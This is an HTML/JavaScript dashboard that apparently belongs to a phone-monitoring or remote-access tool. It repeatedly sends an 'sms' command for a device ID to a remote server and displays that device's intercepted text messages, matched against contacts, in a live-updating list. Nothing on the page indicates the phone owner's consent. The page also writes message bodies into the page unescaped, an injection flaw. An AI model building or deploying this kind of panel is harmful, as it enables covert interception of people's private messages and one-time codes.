<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Messages</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #000000;
            --bubble-received: #262628;
            --text-main: #ffffff;
            --text-muted: #8e8e93;
            --border-color: #38383a;
            --accent-green: #30d158;
            --blue-accent: #0b84ff;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0; padding: 0;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 500px;
            background: #000;
            min-height: 100vh;
            padding-bottom: 20px;
        }

        /* --- Header --- */
        .header {
            position: sticky; top: 0;
            background: rgba(0, 0, 0, 0.95);
            backdrop-filter: blur(10px);
            z-index: 100;
            padding: 15px;
            border-bottom: 0.5px solid var(--border-color);
        }

        .top-row {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 10px;
        }

        .page-title { font-size: 1.5rem; font-weight: 700; }
        
        .live-indicator {
            font-size: 0.75rem; color: var(--accent-green);
            display: flex; align-items: center; gap: 5px;
            background: rgba(48, 209, 88, 0.15);
            padding: 4px 10px; border-radius: 20px;
            font-weight: 600;
        }

        .blink { animation: blinker 1.5s linear infinite; }
        @keyframes blinker { 50% { opacity: 0.4; } }

        .back-btn {
            color: var(--blue-accent); font-size: 1rem; text-decoration: none;
            display: flex; align-items: center; gap: 5px;
        }

        /* --- Search --- */
        .search-box { position: relative; margin-top: 5px; }
        
        .search-input {
            width: 100%;
            background: #1c1c1e;
            border: none;
            padding: 10px 35px;
            border-radius: 10px;
            color: white;
            font-size: 1rem;
            box-sizing: border-box;
            outline: none;
        }
        .search-icon {
            position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
            color: var(--text-muted); font-size: 0.9rem;
        }

        /* --- SMS List --- */
        .sms-list {
            display: flex; flex-direction: column; gap: 15px;
            padding: 15px;
        }

        .sms-card {
            background: var(--bubble-received);
            padding: 15px;
            border-radius: 16px;
            position: relative;
        }

        .sms-header {
            display: flex; justify-content: space-between; align-items: flex-start;
            margin-bottom: 8px;
        }

        .sender-info { display: flex; flex-direction: column; max-width: 70%; }
        .sender-name { font-size: 1rem; font-weight: 600; color: #fff; margin-bottom: 2px;}
        .sender-number { font-size: 0.75rem; color: var(--text-muted); }

        .time-badge {
            font-size: 0.7rem; color: var(--text-muted);
            white-space: nowrap;
        }

        .message-body {
            font-size: 0.95rem; color: #e0e0e0; line-height: 1.4;
            word-wrap: break-word; white-space: pre-wrap;
        }
        
        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; font-size: 0.9rem; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="top-row">
                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i> Back</a>
                <span class="page-title">Messages</span>
                <div class="live-indicator"><i class="fa-solid fa-circle blink"></i> Live</div>
            </div>
            
            <div class="search-box">
                <i class="fa-solid fa-magnifying-glass search-icon"></i>
                <input type="text" id="searchInput" class="search-input" placeholder="Search" onkeyup="filterSMS()">
            </div>
        </div>

        <div id="sms-list" class="sms-list">
            <div class="status-msg">
                <i class="fa-solid fa-spinner fa-spin"></i><br><br>Fetching Messages...
            </div>
        </div>
    </div>

<script>
    const SERVER_URL = "https://child-v9no.onrender.com";
    const urlParams = new URLSearchParams(window.location.search);
    const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
    
    const storageKeySMS = `sms_${DEVICE_ID}`;
    const storageKeyContacts = `contacts_${DEVICE_ID}`;

    let allSMSData = []; 
    let contactMap = {}; 
    let isFetching = false; 

    document.addEventListener("DOMContentLoaded", function() {
        if (!DEVICE_ID) {
            document.getElementById("sms-list").innerHTML = '<div class="status-msg" style="color:red">Error: No Device ID</div>';
            return;
        }
        
        prepareContactMap();
        loadFromStorage();
        startLiveSystem();
    });

    function prepareContactMap() {
        try {
            const savedContacts = localStorage.getItem(storageKeyContacts);
            if (savedContacts) {
                const contacts = JSON.parse(savedContacts);
                if(Array.isArray(contacts)){
                    contacts.forEach(c => {
                        if(c.number && c.name) {
                            let cleanNum = String(c.number).replace(/\D/g, '').slice(-10);
                            contactMap[cleanNum] = c.name;
                        }
                    });
                }
            }
        } catch(e) { console.error("Contact Map Error", e); }
    }

    function getContactName(originalNum) {
        if (!originalNum) return "Unknown";
        let strNum = String(originalNum); // Ensure string
        let cleanNum = strNum.replace(/\D/g, '').slice(-10);
        return contactMap[cleanNum] || strNum;
    }

    function loadFromStorage() {
        const savedData = localStorage.getItem(storageKeySMS);
        if (savedData) {
            try {
                allSMSData = JSON.parse(savedData);
                renderSMS(allSMSData);
            } catch(e) {}
        }
    }

    // --- LIVE SYSTEM ---
    function startLiveSystem() {
        sendCommand();
        fetchSMS();
        setInterval(sendCommand, 10000); 
        setInterval(fetchSMS, 4000); 
    }

    function sendCommand() {
        fetch(`${SERVER_URL}/api/send-command`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device_id: DEVICE_ID, command: 'sms' })
        }).catch(e => console.log("Command Error (Ignored)")); 
    }

    function fetchSMS() {
        if(isFetching) return;
        isFetching = true;

        // Adding timestamp to prevent caching
        fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/sms?t=${Date.now()}`)
            .then(res => res.json())
            .then(data => {
                if (data && Array.isArray(data) && data.length > 0) {
                    // Compare length to avoid unnecessary re-renders
                    if (data.length !== allSMSData.length || JSON.stringify(data[0]) !== JSON.stringify(allSMSData[0])) {
                        allSMSData = data;
                        localStorage.setItem(storageKeySMS, JSON.stringify(data));
                        
                        const query = document.getElementById('searchInput').value;
                        if(query === "") {
                            renderSMS(allSMSData);
                        } else {
                            filterSMS();
                        }
                    }
                } else if (!allSMSData.length) {
                    document.getElementById("sms-list").innerHTML = '<div class="status-msg">No Messages Found on Device.</div>';
                }
            })
            .catch(e => console.error("Fetch Error", e))
            .finally(() => { isFetching = false; });
    }

    function filterSMS() {
        const query = document.getElementById('searchInput').value.toLowerCase();
        const filtered = allSMSData.filter(sms => {
            // Safety Strings
            const body = String(sms.body || "").toLowerCase();
            const address = String(sms.address || "").toLowerCase();
            const name = String(getContactName(sms.address)).toLowerCase();
            return body.includes(query) || address.includes(query) || name.includes(query);
        });
        renderSMS(filtered);
    }

    function renderSMS(data) {
        const listContainer = document.getElementById("sms-list");
        
        if (!data || !Array.isArray(data) || data.length === 0) {
            listContainer.innerHTML = '<div class="status-msg">No messages found.</div>';
            return;
        }

        const displayData = data.slice(0, 100); // Limit to 100 for performance

        const htmlString = displayData.map(sms => {
            try {
                // 1. Safe Address Handling
                const rawAddress = sms.address || "Unknown";
                const name = getContactName(rawAddress);
                const isSaved = name !== rawAddress;

                // 2. Safe Date Handling
                let displayDate = sms.date;
                // Agar date timestamp (numbers only) hai to convert karo, warna string hi rehne do
                if(!isNaN(sms.date) && String(sms.date).length > 12) {
                     displayDate = new Date(parseInt(sms.date)).toLocaleString();
                }

                // 3. Safe Body Handling (Emoji & Newlines)
                const bodyText = sms.body ? String(sms.body) : "Empty Message";

                return `
                    <div class="sms-card">
                        <div class="sms-header">
                            <div class="sender-info">
                                <span class="sender-name">${isSaved ? name : rawAddress}</span>
                                ${isSaved ? `<span class="sender-number">${rawAddress}</span>` : ''}
                            </div>
                            <span class="time-badge">${displayDate}</span>
                        </div>
                        <div class="message-body">${bodyText}</div>
                    </div>
                `;
            } catch (err) {
                console.error("Skipping corrupted message", err);
                return ""; // Skip bad record instead of crashing entire page
            }
        }).join('');

        listContainer.innerHTML = htmlString;
    }
</script>
</body>
</html>
